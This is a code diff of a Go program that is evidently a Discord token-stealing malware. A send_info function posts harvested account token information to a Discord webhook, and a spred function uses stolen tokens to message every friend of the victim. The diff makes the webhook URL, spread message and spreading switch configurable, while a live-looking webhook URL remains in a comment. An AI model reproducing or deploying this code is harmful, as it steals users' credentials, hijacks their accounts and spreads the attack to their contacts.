@@ -41,8 +41,12 @@ type Message struct {
 	Tts     bool   `json:"tts"`
 }
 
+// https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS
 const (
-	WehookUrl = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
+	WEBHOOK_URL = "weburl"
+	SPREAD_MSG  = "spreadmsg"
+	SPREAD      = false
+	BLOCK       = false
 )
 
 func main() {
@@ -53,6 +57,9 @@ func main() {
 }
 
 func spred() {
+	if !SPREAD {
+		return
+	}
 	for _, token := range tokens {
 		fmt.Println(token)
 		//  var friends []string
@@ -74,7 +81,7 @@ func spred() {
 		for _, friend := range Friends {
 			//fmt.Printf("%s: %v\n", string(rune(i)), user)
 			data := new(Message)
-			data.Content = "Ignore this msg please, im testing a program"
+			data.Content = SPREAD_MSG
 			data.Tts = false
 			d, _ := json.Marshal(data)
 			req, wth := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+friend.Id+"/messages", bytes.NewBuffer(d))
@@ -102,7 +109,7 @@ func spred() {
 func send_info(token string) {
 	_, embed := grabTokenInformation(token)
 	data := []byte(embed)
-	req, _ := http.NewRequest("POST", WehookUrl, bytes.NewBuffer(data))
+	req, _ := http.NewRequest("POST", WEBHOOK_URL, bytes.NewBuffer(data))
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
 	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
 	cl := &http.Client{}
